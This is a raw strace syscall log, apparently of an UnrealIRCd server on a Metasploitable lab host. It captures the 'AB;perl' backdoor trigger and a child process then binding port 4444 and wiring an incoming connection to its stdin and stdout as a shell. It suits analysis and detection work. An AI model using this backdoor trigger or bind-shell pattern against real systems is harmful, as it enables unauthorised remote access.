CPHB\t# Radio Shortest Path First (officially CPHB)\nvmtp\t81\tVMTP\t\t# Versatile Message Transport\neigrp\t88\tEIGRP\t\t# Enhanced Interior Routing Protocol (Cisco)\nospf\t89\tOSPFIGP\t\t# Open Shortest Path First IGP\nax.25\t93\tAX.25\t\t# AX.25 frames\nipip\t94\tIPIP\t\t# IP-within-IP Encapsulation Protocol\netherip\t97\tETHERIP\t\t# Ethernet-within-IP Encapsulation [RFC3378]\nencap\t98\tENCAP\t\t# Yet Another IP encapsulation [RFC1241]\n#\t99\t\t\t# any private encryption scheme\npim\t103\tPIM\t\t# Protocol Independent Multicast\nipcomp\t108\tIPCOMP\t\t# IP Payload Compression Protocol\nvrrp\t112\tVRRP\t\t# Virtual Router Redundancy Protocol\nl2tp\t115\tL2TP\t\t# Layer Two Tunneling Protocol [RFC2661]\nisis\t124\tISIS\t\t# IS-IS over IPv4\nsctp\t132\tSCTP\t\t# Stream Control Transmission Protocol\nfc\t133\tFC\t\t# Fibre Channel\nudplite\t136\tUDPLite\t\t# UDP-Lite\n\n", 4096) = 2510
10105 20:03:04.082339 close(6)          = 0
10105 20:03:04.082349 munmap(0xb7d9a000, 4096) = 0
10105 20:03:04.082377 socket(PF_INET, SOCK_STREAM, IPPROTO_TCP) = 6
10105 20:03:04.082419 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44be8) = -1 EINVAL (Invalid argument)
10105 20:03:04.082475 _llseek(6, 0, 0xbfa44c30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.082505 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44be8) = -1 EINVAL (Invalid argument)
10105 20:03:04.082516 _llseek(6, 0, 0xbfa44c30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.082526 fcntl64(6, F_SETFD, FD_CLOEXEC) = 0
10105 20:03:04.082594 setsockopt(6, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
10105 20:03:04.082630 bind(6, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("0.0.0.0")}, 16) = 0
10105 20:03:04.082656 listen(6, 5)      = 0
10105 20:03:04.082715 accept(6,  <unfinished ...>
10104 20:03:04.083058 exit_group(0)     = ?
10102 20:03:04.158163 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10104
10102 20:03:04.158241 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
10102 20:03:04.158285 --- SIGCHLD (Child exited) @ 0 (0) ---
10102 20:03:04.158304 waitpid(-1, 0xbfcab828, WNOHANG) = -1 ECHILD (No child processes)
10102 20:03:04.158329 sigreturn()       = ? (mask now [])
10102 20:03:04.158357 rt_sigaction(SIGINT, {SIG_DFL}, {0x807f150, [], 0}, 8) = 0
10102 20:03:04.158410 exit_group(0)     = ?
4519  20:03:04.158459 <... waitpid resumed> [{WIFEXITED(s) && WEXITSTATUS(s) == 0}], 0) = 10102
4519  20:03:04.158472 rt_sigaction(SIGINT, {0x8062280, [HUP INT], 0}, NULL, 8) = 0
4519  20:03:04.158487 rt_sigaction(SIGQUIT, {SIG_IGN}, NULL, 8) = 0
4519  20:03:04.158498 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
4519  20:03:04.158508 --- SIGCHLD (Child exited) @ 0 (0) ---
4519  20:03:04.158527 send(5, ":irc.Metasploitable.LAN 451 AB;perl :You have not registered\r\n", 62, 0) = 62
4519  20:03:04.158599 time(NULL)        = 1495670584
4519  20:03:04.158611 time(NULL)        = 1495670584
4519  20:03:04.158694 gettimeofday({1495670584, 158700}, NULL) = 0
4519  20:03:04.158724 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:03:04.158757 clock_gettime(CLOCK_MONOTONIC, {47393, 975770516}) = 0
4519  20:03:04.158770 gettimeofday({1495670584, 158775}, NULL) = 0
4519  20:03:04.158782 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 2 (in [4 9], left {1, 0})
4519  20:03:04.158838 clock_gettime(CLOCK_MONOTONIC, {47393, 975850800}) = 0
4519  20:03:04.158850 recv(9, "PRIVMSG  #testit2 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 71
4519  20:03:04.158876 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158893 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158908 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158923 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158936 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158957 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158971 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158985 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.158999 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159013 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159026 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159040 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159054 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159068 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159081 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159095 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159108 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159122 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159136 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159184 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159200 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159227 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159246 recv(4, "PRIVMSG  #testit0 Hiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiiii\nPRIVMSG  #testit0 BLABLALBLALBLALBLALBLALBLALBLALABLLALBLA\nPRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZ\nPRIVMSG  #testit0 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 230
4519  20:03:04.159281 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159296 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159310 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159324 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159338 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159352 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159366 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159380 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159393 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159407 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159421 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159434 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159448 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159461 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159475 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159489 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159502 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159516 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159529 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159543 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159557 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159574 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159590 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159604 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159618 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159633 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159638 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159638 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159639 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159639 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159639 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159639 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159639 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159640 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159651 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159665 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159678 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159692 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159706 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159720 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159733 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159747 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159761 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159775 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159791 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159806 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159820 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159834 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159848 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159862 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159876 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159889 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159933 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159948 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159976 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.159990 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160003 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160017 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160031 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160044 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160058 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160071 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160088 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160102 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160116 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160130 getrusage(RUSAGE_SELF, {ru_utime={0, 160000}, ru_stime={3, 110000}, ...}) = 0
4519  20:03:04.160146 send(4, ":irc.Metasploitable.LAN 421 bla0 CPRIVMSG :Unknown command\r\n", 60, 0) = 60
4519  20:03:04.160171 gettimeofday({1495670584, 160176}, NULL) = 0
4519  20:03:04.160184 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [4], left {0, 880000})
4519  20:03:04.277408 clock_gettime(CLOCK_MONOTONIC, {47394, 94416722}) = 0
4519  20:03:04.277408 recv(4, "MOTD\n", 8192, 0) = 5
4519  20:03:04.277408 send(4, ":irc.Metasploitable.LAN 422 bla0 :MOTD File is missing\r\n", 56, 0) = 56
4519  20:03:04.277408 time(NULL)        = 1495670584
4519  20:03:04.277409 time(NULL)        = 1495670584
4519  20:03:04.277409 gettimeofday({1495670584, 277409}, NULL) = 0
4519  20:03:04.277409 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:03:04.277415 clock_gettime(CLOCK_MONOTONIC, {47394, 94428273}) = 0
4519  20:03:04.277426 gettimeofday({1495670584, 277429}, NULL) = 0
4519  20:03:04.277437 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0}) = 1 (in [5], left {0, 910000})
4519  20:03:04.367358 clock_gettime(CLOCK_MONOTONIC, {47394, 184367270}) = 0
4519  20:03:04.367358 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  20:03:04.367359 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  20:03:04.367359 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  20:03:04.367359 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  20:03:04.367363 close(5)          = 0
4519  20:03:04.367379 gettimeofday({1495670584, 367383}, NULL) = 0
4519  20:03:04.367392 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
10105 20:03:04.367421 <... accept resumed> {sa_family=AF_INET, sin_port=htons(36603), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
10105 20:03:04.367444 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa43bd8) = -1 EINVAL (Invalid argument)
10105 20:03:04.367457 _llseek(8, 0, 0xbfa43c20, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.367470 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa43bd8) = -1 EINVAL (Invalid argument)
10105 20:03:04.367480 _llseek(8, 0, 0xbfa43c20, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.367490 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
10105 20:03:04.367532 close(6)          = 0
10105 20:03:04.367727 dup(8)            = 6
10105 20:03:04.367742 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44a78) = -1 EINVAL (Invalid argument)
10105 20:03:04.367754 _llseek(6, 0, 0xbfa44ac0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.367765 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10105 20:03:04.367785 dup2(6, 1)        = 1
10105 20:03:04.367810 close(6)          = 0
10105 20:03:04.367821 fcntl64(1, F_SETFD, 0) = 0
10105 20:03:04.367832 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44a48) = -1 EINVAL (Invalid argument)
10105 20:03:04.367842 _llseek(1, 0, 0xbfa44a90, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.367872 dup(8)            = 6
10105 20:03:04.367884 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44a78) = -1 EINVAL (Invalid argument)
10105 20:03:04.367895 _llseek(6, 0, 0xbfa44ac0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10105 20:03:04.367905 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
10105 20:03:04.367921 dup2(6, 0)        = 0
10105 20:03:04.367931 close(6)          = 0
10105 20:03:04.367941 fcntl64(0, F_SETFD, 0) = 0
10105 20:03:04.367954 fcntl64(0, F_SETFD, 0) = 0
10105 20:03:04.367971 read(0,  <unfinished ...>
4519  20:03:04.667364 <... select resumed> ) = 1 (in [9], left {0, 700000})
4519  20:03:04.667364 clock_gettime(CLOCK_MONOTONIC, {47394, 484373492}) = 0
4519  20:03:04.667365 recv(9, "AWAY  ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNOPQRSTUVWXYZ\n", 8192, 0) = 59
4519  20:03:04.667377 time(NULL)        = 1495670584
4519  20:03:04.667392 time(NULL)        = 1495670584
4519  20:03:04.667404 gettimeofday({1495670584, 667408}, NULL) = 0
4519  20:03:04.667418 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  20:03:04.667447 clock_gettime(CLOCK_MONOTONIC, {47394, 484460459}) = 0
4519  20:03:04.667458 gettimeofday({1495670584, 667462}, NULL) = 0
4519  20:03:04.667469 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
